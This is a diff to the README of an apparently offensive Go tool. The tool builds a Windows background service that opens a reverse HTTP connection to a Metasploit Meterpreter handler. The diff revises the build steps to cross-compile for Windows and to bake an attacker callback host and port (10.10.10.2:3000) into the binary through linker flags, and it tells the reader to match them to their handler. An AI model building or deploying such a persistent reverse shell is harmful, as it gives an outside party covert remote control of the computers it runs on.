@@ -7,18 +7,14 @@ A simple windows service running on background that connects with a meterpreter 
 ### Usage
 First, you need [go](https://golang.org/dl/) for build the binary (duh!) and [metasploit-framework](https://github.com/rapid7/metasploit-framework) for accepts the reverse connection
 
-Change the LHOST and LPORT on `exploit.go` (metasploit handler ip and port)
 ```
 git clone https://github.com/mauri870/powershell-reverse-http.git
 cd powershell-reverse-http
 go get golang.org/x/sys/windows
-go build -o powershell-reverse.exe
+env GOOS=windows go build -ldflags "-X main.LHOST=10.10.10.2 -X main.LPORT=3000" -o powershell-reverse.exe
 ```
 
-To build on a linux machine, you need set the GOOS env to "windows"
-```
-env GOOS=windows go build -o powershell-reverse.exe
-```
+Change the LPORT and LHOST to match your metasploit handler
 
 ## Usage
 ```
